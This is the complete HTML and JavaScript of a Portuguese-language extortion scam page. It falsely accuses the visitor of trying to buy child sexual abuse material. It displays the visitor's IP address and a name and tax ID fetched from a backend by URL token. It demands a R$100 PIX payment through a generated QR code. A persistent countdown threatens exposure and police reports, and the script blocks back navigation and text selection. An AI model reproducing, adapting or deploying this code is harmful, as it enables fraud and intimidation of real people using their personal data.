<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
  <title>SE FODEU</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    
    html, body {
      background: #f8f9fa;
      color: #212529;
      font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      font-size: 16px;
      line-height: 1.6;
      width: 100%;
      min-height: 100vh;
      overflow-x: hidden;
      padding: 20px;
      padding-top: 120px; /* Espaço para o timer fixo */
    }
    
    /* Timer fixo no topo */
    .fixed-timer {
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      z-index: 1000;
      background: linear-gradient(135deg, #dc3545, #c82333);
      color: white;
      padding: 15px 20px;
      text-align: center;
      box-shadow: 0 4px 20px rgba(220, 53, 69, 0.4);
      border-bottom: 3px solid #a71e2a;
    }
    
    .fixed-timer-text {
      font-size: 14px;
      font-weight: 600;
      margin-bottom: 8px;
      text-transform: uppercase;
      letter-spacing: 0.5px;
      animation: pulse 2s infinite;
    }
    
    .fixed-timer-countdown {
      font-size: 28px;
      font-weight: 800;
      font-family: 'Inter', monospace;
      letter-spacing: 2px;
      text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
      animation: glow 1.5s ease-in-out infinite alternate;
    }
    
    @keyframes pulse {
      0%, 100% { opacity: 1; }
      50% { opacity: 0.7; }
    }
    
    @keyframes glow {
      from { text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3), 0 0 10px rgba(255, 255, 255, 0.2); }
      to { text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3), 0 0 20px rgba(255, 255, 255, 0.4); }
    }
    
    .container {
      width: 100%;
      max-width: 800px;
      background: #ffffff;
      border: 1px solid #dee2e6;
      border-radius: 8px;
      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
      padding: 40px;
      text-align: left;
      margin: 0 auto;
    }
    
    .header {
      text-align: center;
      margin-bottom: 40px;
      padding-bottom: 30px;
      border-bottom: 2px solid #dc3545;
    }
    
    .main-title {
      font-size: 24px;
      font-weight: 800;
      color: #dc3545;
      margin-bottom: 10px;
      text-transform: uppercase;
      letter-spacing: 0.5px;
    }
    
    .subtitle {
      font-size: 14px;
      color: #6c757d;
      font-weight: 500;
      text-transform: uppercase;
      letter-spacing: 1px;
    }
    
    .section {
      margin-bottom: 35px;
      padding: 25px;
      background: #f8f9fa;
      border-left: 4px solid #dc3545;
      border-radius: 4px;
    }
    
    .section-title {
      font-size: 18px;
      font-weight: 700;
      color: #dc3545;
      margin-bottom: 15px;
      text-transform: uppercase;
    }
    
    .intro-text {
      font-size: 16px;
      font-weight: 600;
      color: #212529;
      margin-bottom: 20px;
      line-height: 1.7;
    }
    
    .accusation-text {
      font-size: 15px;
      color: #495057;
      margin-bottom: 20px;
      line-height: 1.7;
    }
    
    .highlight-text {
      font-size: 18px;
      font-weight: 700;
      color: #dc3545;
      text-align: center;
      margin: 25px 0;
      padding: 15px;
      background: #fff5f5;
      border: 2px solid #dc3545;
      border-radius: 6px;
    }
    
    .crime-details {
      background: #fff3cd;
      border: 1px solid #ffeaa7;
      border-radius: 6px;
      padding: 20px;
      margin: 20px 0;
    }
    
    .crime-title {
      font-size: 16px;
      font-weight: 700;
      color: #856404;
      margin-bottom: 10px;
    }
    
    .crime-text {
      font-size: 15px;
      color: #856404;
      font-weight: 600;
    }
    
    .evidence-section {
      background: #e9ecef;
      padding: 25px;
      border-radius: 6px;
      margin: 25px 0;
    }
    
    .evidence-title {
      font-size: 16px;
      font-weight: 700;
      color: #495057;
      margin-bottom: 15px;
      text-transform: uppercase;
    }
    
    .evidence-list {
      list-style: none;
      padding: 0;
    }
    
    .evidence-list li {
      font-size: 14px;
      color: #495057;
      margin: 8px 0;
      padding-left: 20px;
      position: relative;
      font-weight: 500;
    }
    
    .evidence-list li::before {
      content: "•";
      color: #dc3545;
      font-weight: bold;
      position: absolute;
      left: 0;
    }
    
    .warning-section {
      background: #d1ecf1;
      border: 1px solid #bee5eb;
      border-radius: 6px;
      padding: 25px;
      margin: 25px 0;
      text-align: center;
    }
    
    .warning-title {
      font-size: 18px;
      font-weight: 700;
      color: #0c5460;
      margin-bottom: 15px;
      text-transform: uppercase;
    }
    
    .warning-text {
      font-size: 15px;
      color: #0c5460;
      font-weight: 600;
    }
    
    .solution-section {
      background: #d4edda;
      border: 2px solid #28a745;
      border-radius: 8px;
      padding: 30px;
      margin: 30px 0;
      text-align: center;
    }
    
    .solution-title {
      font-size: 20px;
      font-weight: 700;
      color: #155724;
      margin-bottom: 20px;
      text-transform: uppercase;
    }
    
    .solution-text {
      font-size: 16px;
      color: #155724;
      margin-bottom: 25px;
      font-weight: 600;
      line-height: 1.7;
    }
    
    .pix-section {
      background: #ffffff;
      border: 3px solid #28a745;
      border-radius: 10px;
      padding: 30px;
      margin: 25px 0;
      text-align: center;
      box-shadow: 0 4px 8px rgba(40, 167, 69, 0.2);
    }
    
    .pix-title {
      font-size: 22px;
      font-weight: 800;
      color: #28a745;
      margin-bottom: 20px;
      text-transform: uppercase;
      letter-spacing: 0.5px;
    }
    
    .qr-code-container {
      margin: 25px 0;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    
    .qr-code-image {
      max-width: 220px;
      max-height: 220px;
      border: 3px solid #28a745;
      background: white;
      padding: 15px;
      border-radius: 8px;
      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
    }
    
    .pix-code-section {
      margin-top: 25px;
    }
    
    .pix-code-label {
      font-size: 16px;
      color: #495057;
      margin-bottom: 10px;
      font-weight: 600;
    }
    
    .pix-code {
      font-family: 'Courier New', monospace;
      font-size: 12px;
      color: #495057;
      background: #f8f9fa;
      padding: 15px;
      border: 2px solid #dee2e6;
      border-radius: 6px;
      word-break: break-all;
      margin-bottom: 15px;
      font-weight: 500;
      cursor: pointer;
      transition: all 0.3s ease;
      position: relative;
    }
    
    .pix-code:hover {
      background: #e9ecef;
      border-color: #28a745;
      box-shadow: 0 2px 8px rgba(40, 167, 69, 0.2);
    }
    
    .pix-code.copied {
      background: #28a745;
      border-color: #28a745;
      color: #ffffff;
      font-weight: 700;
    }
    

    
    .loading-qr {
      color: #28a745;
      font-size: 16px;
      margin: 20px 0;
      font-weight: 600;
    }
    
    .error-qr {
      color: #dc3545;
      font-size: 14px;
      margin: 20px 0;
      font-weight: 600;
    }
    
    .countdown-section {
      background: #f8d7da;
      border: 2px solid #dc3545;
      border-radius: 8px;
      padding: 25px;
      margin: 30px 0;
      text-align: center;
    }
    
    .countdown-label {
      font-size: 16px;
      color: #721c24;
      margin-bottom: 15px;
      font-weight: 600;
    }
    
    .countdown {
      font-size: 36px;
      font-weight: 800;
      font-family: 'Inter', monospace;
      background: #dc3545;
      color: #ffffff;
      padding: 15px 30px;
      border-radius: 8px;
      display: inline-block;
      letter-spacing: 2px;
      box-shadow: 0 4px 8px rgba(220, 53, 69, 0.3);
    }
    
    .countdown-warning {
      font-size: 14px;
      color: #721c24;
      margin-top: 15px;
      font-weight: 500;
      font-style: italic;
    }
    
    .final-warning {
      background: #f8d7da;
      border: 2px solid #dc3545;
      border-radius: 8px;
      padding: 30px;
      margin: 30px 0;
      text-align: center;
    }
    
    .final-warning-title {
      font-size: 20px;
      font-weight: 800;
      color: #721c24;
      margin-bottom: 20px;
      text-transform: uppercase;
    }
    
    .final-warning-text {
      font-size: 15px;
      color: #721c24;
      margin: 10px 0;
      font-weight: 600;
      line-height: 1.6;
    }
    
    .exposure-list {
      list-style: none;
      padding: 0;
      text-align: left;
      max-width: 500px;
      margin: 20px auto;
    }
    
    .exposure-list li {
      font-size: 15px;
      color: #721c24;
      margin: 8px 0;
      padding-left: 25px;
      position: relative;
      font-weight: 600;
    }
    
    .exposure-list li::before {
      content: "⚠️";
      position: absolute;
      left: 0;
    }
    
    /* Mobile responsiveness */
    @media (max-width: 768px) {
      body {
        padding: 10px;
        padding-top: 100px; /* Espaço menor para mobile */
      }
      
      .fixed-timer {
        padding: 10px 15px;
      }
      
      .fixed-timer-text {
        font-size: 12px;
        margin-bottom: 5px;
      }
      
      .fixed-timer-countdown {
        font-size: 22px;
        letter-spacing: 1px;
      }
      
      .container {
        padding: 20px;
      }
      
      .main-title {
        font-size: 20px;
      }
      
      .intro-text {
        font-size: 14px;
      }
      
      .countdown {
        font-size: 28px;
        padding: 12px 20px;
      }
      
      .pix-title {
        font-size: 18px;
      }
      
      .qr-code-image {
        max-width: 180px;
        max-height: 180px;
      }
      
      .pix-code {
        font-size: 10px;
        padding: 12px;
      }
    }
    
    /* Disable all interactions */
    * {
      -webkit-user-select: none;
      -moz-user-select: none;
      -ms-user-select: none;
      user-select: none;
      -webkit-touch-callout: none;
      -webkit-tap-highlight-color: transparent;
    }
    
    body {
      -webkit-user-select: none;
      -moz-user-select: none;
      -ms-user-select: none;
      user-select: none;
    }
  </style>
</head>
<body>
  <!-- Timer fixo no topo -->
  <div class="fixed-timer">
    <div class="fixed-timer-text">Tá acabando o tempo, quando chegar a 0 sua vida acaba!!</div>
    <div class="fixed-timer-countdown" id="fixed-contador">10:00</div>
  </div>

  <div class="container">
    <div class="header">
      <div class="main-title">
        🚨 VOCÊ FOI PEGO NO FLAGRANTE 🚨
      </div>
      <div class="subtitle">
        SE FODEU
      </div>
    </div>
    
    <div class="section">
      <div class="intro-text">
        <strong>Olá <span id="nome-cliente">[CARREGANDO NOME...]</span>, portador do CPF: <span id="cpf-cliente">[CARREGANDO CPF...]</span></strong>
      </div>
      <div class="accusation-text">
        A gente rastreou sua tentativa de comprar conteúdo proibido com menores de idade.<br>
        Você acessou isso às <strong><span id="hora-tentativa">[CARREGANDO...]</span></strong>, usando o IP <strong><span id="ip-cliente">[CARREGANDO IP...]</span></strong>.
      </div>
    </div>
    
    <div class="highlight-text">
      E FOI TUDO GRAVADO.
    </div>
    
    <div class="crime-details">
      <div class="crime-title">ISSO É CRIME FEDERAL - ARTIGO 241-A DO ECA</div>
      <div class="crime-text">PENA: 3 A 6 ANOS DE PRISÃO + MULTA</div>
    </div>
    
    <div class="evidence-section">
      <div class="evidence-title">PROVAS COLETADAS:</div>
      <ul class="evidence-list">
        <li>Histórico completo de navegação</li>
        <li>Screenshots da tentativa de compra</li>
        <li>Dados do dispositivo e localização GPS</li>
        <li>Registro de IP com horário exato</li>
        <li>Dados bancários vinculados ao CPF</li>
      </ul>
    </div>
    
    <div class="warning-section">
      <div class="warning-title">VOCÊ SERÁ DENUNCIADO À POLÍCIA FEDERAL</div>
      <div class="warning-text">SEUS DADOS VÃO PARA O MINISTÉRIO PÚBLICO</div>
    </div>
    
    <div class="solution-section">
      <div class="solution-title">SOLUÇÃO DISPONÍVEL</div>
      <div class="solution-text">
        A menos que compre pelo nosso silêncio.
      </div>
      
      <div class="pix-section">
        <div class="pix-title">PIX DE RESGATE - R$ 100,00</div>
        
        <div id="qr-loading" class="loading-qr">
          Gerando QR code PIX...
        </div>
        
        <div id="qr-container" class="qr-code-container" style="display: none;">
          <img id="qr-image" class="qr-code-image" alt="QR Code PIX" />
        </div>
        
        <div id="pix-code-container" class="pix-code-section" style="display: none;">
          <div class="pix-code-label">Código PIX (Clique para Copiar):</div>
          <div id="pix-code" class="pix-code" onclick="copiarCodigoPIX()"></div>
          <div style="font-size: 14px; color: #6c757d; margin-top: 10px;">
            <strong>Clique no código acima para copiar</strong> ou escaneie o QR code
          </div>
        </div>
        
        <div id="qr-error" class="error-qr" style="display: none;">
          Erro ao gerar QR code. Tente recarregar a página.
        </div>
      </div>
      
      <div class="solution-text">
        <strong>Pague e apagamos seu nome, CPF e dados do nosso banco de dados.<br>
        Não pague e espere a polícia bater na sua porta.</strong>
      </div>
    </div>
    
    <div class="countdown-section">
      <div class="countdown-label">⏰ TEMPO RESTANTE PARA EXPOSIÇÃO PÚBLICA</div>
      <div class="countdown" id="contador">10:00</div>
      <div class="countdown-warning">
        (esse tempo NÃO reinicia, nem se você sair. Zerou, já era.)
      </div>
    </div>
    
    <div class="final-warning">
      <div class="final-warning-title">QUANDO O TEMPO ACABAR, TODOS OS SEUS DADOS VÃO SER EXPOSTOS:</div>
      <ul class="exposure-list">
        <li>Seu nome e CPF completo</li>
        <li>Endereço residencial</li>
        <li>Telefone e e-mail</li>
        <li>Fotos das tentativas de compra</li>
        <li>Histórico de navegação</li>
        <li>Associados a crimes cibernéticos</li>
      </ul>
      <div class="final-warning-text">
        <strong>Esta é sua última oportunidade de resolver isso discretamente.</strong>
      </div>
    </div>
  </div>

  <script>
    // Capturar dados da URL
    const urlParams = new URLSearchParams(window.location.search);
    const token = urlParams.get('token');
    
    // Variáveis para controle da sessão
    let sessionId = null;
    let timerInterval = null;
    
    // Dados padrão
    let dadosCliente = {
      nome: 'USUÁRIO DETECTADO',
      cpf: 'CPF RASTREADO', 
      ip: 'IP CAPTURADO',
      hora: 'HORÁRIO REGISTRADO'
    };
    
    // Função para obter hora atual formatada
    function obterHoraAtual() {
      const agora = new Date();
      const horas = agora.getHours().toString().padStart(2, '0');
      const minutos = agora.getMinutes().toString().padStart(2, '0');
      const segundos = agora.getSeconds().toString().padStart(2, '0');
      return `${horas}:${minutos}:${segundos}`;
    }
    
    // Função para obter IP do usuário
    async function obterIPUsuario() {
      try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
      } catch (error) {
        return 'IP OCULTO';
      }
    }
    
    // Função para criar nova sessão de timer
    async function criarSessaoTimer() {
      if (!token) {
        console.log('Token não encontrado, usando timer padrão');
        iniciarTimerPadrao();
        return;
      }
      
      try {
        const response = await fetch('/api/criar-sessao-timer', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({ token: token })
        });
        
        const data = await response.json();
        
        if (data.success) {
          sessionId = data.sessionId;
          console.log('Sessão de timer criada:', sessionId);
          iniciarTimerSessao();
        } else {
          console.log('Erro ao criar sessão:', data.error);
          iniciarTimerPadrao();
        }
      } catch (error) {
        console.log('Erro na requisição:', error);
        iniciarTimerPadrao();
      }
    }
    
    // Função para iniciar timer baseado na sessão
    function iniciarTimerSessao() {
      if (!sessionId) {
        iniciarTimerPadrao();
        return;
      }
      
      // Atualizar contador baseado na sessão
      timerInterval = setInterval(async () => {
        try {
          const response = await fetch(`/api/status-sessao-timer/${sessionId}`);
          const data = await response.json();
          
          if (data.success && data.active) {
            const minutos = Math.floor(data.timeRemaining / 60);
            const segundos = data.timeRemaining % 60;
            const display = `${minutos.toString().padStart(2, '0')}:${segundos.toString().padStart(2, '0')}`;
            document.getElementById('contador').textContent = display;
            document.getElementById('fixed-contador').textContent = display;
            
            if (data.timeRemaining <= 0) {
              // Timer expirou, finalizar sessão
              await finalizarSessao();
              iniciarNovaContagem();
            }
          } else {
            // Sessão não encontrada ou inativa, usar timer padrão
            clearInterval(timerInterval);
            iniciarTimerPadrao();
          }
        } catch (error) {
          console.log('Erro ao verificar status da sessão:', error);
          // Em caso de erro, continuar com timer padrão
          clearInterval(timerInterval);
          iniciarTimerPadrao();
        }
      }, 1000);
    }
    
    // Função para finalizar sessão atual
    async function finalizarSessao() {
      if (!sessionId) return;
      
      try {
        await fetch('/api/finalizar-sessao-timer', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({ sessionId: sessionId })
        });
      } catch (error) {
        console.log('Erro ao finalizar sessão:', error);
      }
      
      sessionId = null;
    }
    
    // Função para iniciar nova contagem (criar nova sessão)
    function iniciarNovaContagem() {
      if (timerInterval) {
        clearInterval(timerInterval);
      }
      // Aguardar um momento e criar nova sessão
      setTimeout(() => {
        criarSessaoTimer();
      }, 1000);
    }
    
    // Função de fallback para timer padrão com persistência
    function iniciarTimerPadrao() {
      // Verificar se já existe um timer salvo no localStorage
      const timerKey = `timer_${token || 'default'}`;
      let tempoInicial = localStorage.getItem(timerKey);
      let tempoRestante;
      
      if (tempoInicial) {
        const tempoDecorrido = Math.floor((Date.now() - parseInt(tempoInicial)) / 1000);
        tempoRestante = Math.max(0, (10 * 60) - tempoDecorrido);
      } else {
        tempoRestante = 10 * 60; // 10 minutos em segundos
        localStorage.setItem(timerKey, Date.now().toString());
      }
      
      if (timerInterval) {
        clearInterval(timerInterval);
      }
      
      timerInterval = setInterval(() => {
        const minutos = Math.floor(tempoRestante / 60);
        const segundos = tempoRestante % 60;
        const display = `${minutos.toString().padStart(2, '0')}:${segundos.toString().padStart(2, '0')}`;
        document.getElementById('contador').textContent = display;
        document.getElementById('fixed-contador').textContent = display;
        
        if (tempoRestante > 0) {
          tempoRestante--;
        } else {
          // Quando chegar a zero, criar novo timer
          localStorage.setItem(timerKey, Date.now().toString());
          tempoRestante = 10 * 60;
        }
      }, 1000);
    }
    
    // Inicializar dados na página
    async function inicializarDados() {
      // Definir hora atual
      dadosCliente.hora = obterHoraAtual();
      document.getElementById('hora-tentativa').textContent = dadosCliente.hora;
      
      // Obter IP do usuário
      const ipUsuario = await obterIPUsuario();
      dadosCliente.ip = ipUsuario;
      document.getElementById('ip-cliente').textContent = dadosCliente.ip;
      
      // Tentar buscar dados reais se token existir
      if (token) {
        try {
          const response = await fetch(`/api/dados-comprador?token=${token}`);
          const data = await response.json();
          
          if (data.success) {
            if (data.nome && data.nome !== 'N/A' && data.nome.trim() !== '') {
              dadosCliente.nome = data.nome.toUpperCase();
              document.getElementById('nome-cliente').textContent = dadosCliente.nome;
            }
            if (data.cpf && data.cpf !== 'N/A' && data.cpf.trim() !== '') {
              dadosCliente.cpf = data.cpf;
              document.getElementById('cpf-cliente').textContent = dadosCliente.cpf;
            }
            if (data.ip && data.ip !== 'N/A' && data.ip.trim() !== '') {
              dadosCliente.ip = data.ip;
              document.getElementById('ip-cliente').textContent = dadosCliente.ip;
            }
          }
        } catch (error) {
          console.log('Usando dados padrão detectados');
        }
      }
      
      // Definir dados padrão se não carregou
      document.getElementById('nome-cliente').textContent = dadosCliente.nome;
      document.getElementById('cpf-cliente').textContent = dadosCliente.cpf;
      document.getElementById('ip-cliente').textContent = dadosCliente.ip;
    }
    
    // Função para copiar código PIX
    async function copiarCodigoPIX() {
      const pixCodeElement = document.getElementById('pix-code');
      const feedbackElement = document.getElementById('copy-feedback');
      
      if (!pixCodeElement.textContent || pixCodeElement.textContent.trim() === '') {
        return;
      }
      
      // Salvar o código original
      const originalCode = pixCodeElement.textContent.trim();
      
      try {
        // Tentar usar a API moderna do Clipboard
        if (navigator.clipboard && window.isSecureContext) {
          await navigator.clipboard.writeText(originalCode);
        } else {
          // Fallback para navegadores mais antigos
          const textArea = document.createElement('textarea');
          textArea.value = originalCode;
          textArea.style.position = 'fixed';
          textArea.style.left = '-999999px';
          textArea.style.top = '-999999px';
          document.body.appendChild(textArea);
          textArea.focus();
          textArea.select();
          document.execCommand('copy');
          textArea.remove();
        }
        
        // Feedback visual - substituir texto por "COPIADO"
        pixCodeElement.classList.add('copied');
        pixCodeElement.textContent = 'COPIADO';
        
        // Remover feedback após 5 segundos
        setTimeout(() => {
          pixCodeElement.classList.remove('copied');
          pixCodeElement.textContent = originalCode;
        }, 5000);
        
        console.log('Código PIX copiado com sucesso!');
        
      } catch (error) {
        console.error('Erro ao copiar código PIX:', error);
        
        // Feedback de erro
        pixCodeElement.classList.add('copied');
        pixCodeElement.style.background = '#dc3545';
        pixCodeElement.textContent = 'ERRO AO COPIAR';
        
        setTimeout(() => {
          pixCodeElement.classList.remove('copied');
          pixCodeElement.style.background = '';
          pixCodeElement.textContent = originalCode;
        }, 5000);
      }
    }
    
    // Função para gerar QR code PIX
    async function gerarQRCodePIX() {
      const loadingElement = document.getElementById('qr-loading');
      const qrContainer = document.getElementById('qr-container');
      const pixCodeContainer = document.getElementById('pix-code-container');
      const errorElement = document.getElementById('qr-error');
      const qrImage = document.getElementById('qr-image');
      const pixCode = document.getElementById('pix-code');
      
      try {
        console.log('Gerando QR code PIX...');
        
        const response = await fetch('/api/gerar-qr-pix', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({})
        });
        
        const data = await response.json();
        
        if (data.success && data.qr_code_base64 && data.pix_copia_cola) {
          // Esconder loading
          loadingElement.style.display = 'none';
          
          // Mostrar QR code
          qrImage.src = data.qr_code_base64;
          qrContainer.style.display = 'flex';
          
          // Mostrar código PIX
          pixCode.textContent = data.pix_copia_cola;
          pixCodeContainer.style.display = 'block';
          
          console.log('QR code PIX gerado com sucesso:', data.transacao_id);
        } else {
          throw new Error(data.error || 'Erro desconhecido');
        }
        
      } catch (error) {
        console.error('Erro ao gerar QR code PIX:', error);
        
        // Esconder loading
        loadingElement.style.display = 'none';
        
        // Mostrar erro
        errorElement.style.display = 'block';
        errorElement.textContent = 'Erro ao gerar QR code PIX. Tente recarregar a página.';
      }
    }
    
    // Inicializar sistema de timer
    criarSessaoTimer();
    
    // Gerar QR code PIX quando a página carregar
    gerarQRCodePIX();
    
    // Limpar sessão quando a página for fechada
    window.addEventListener('beforeunload', () => {
      if (sessionId) {
        // Usar sendBeacon para enviar requisição mesmo quando a página está sendo fechada
        const formData = new FormData();
        formData.append('sessionId', sessionId);
        navigator.sendBeacon('/api/finalizar-sessao-timer', formData);
      }
    });
    
    // Inicializar dados na página
    inicializarDados();
    
    // Impedir back/forward
    history.pushState(null, null, location.href);
    window.onpopstate = function() {
      history.go(1);
    };
  </script>
</body>
</html>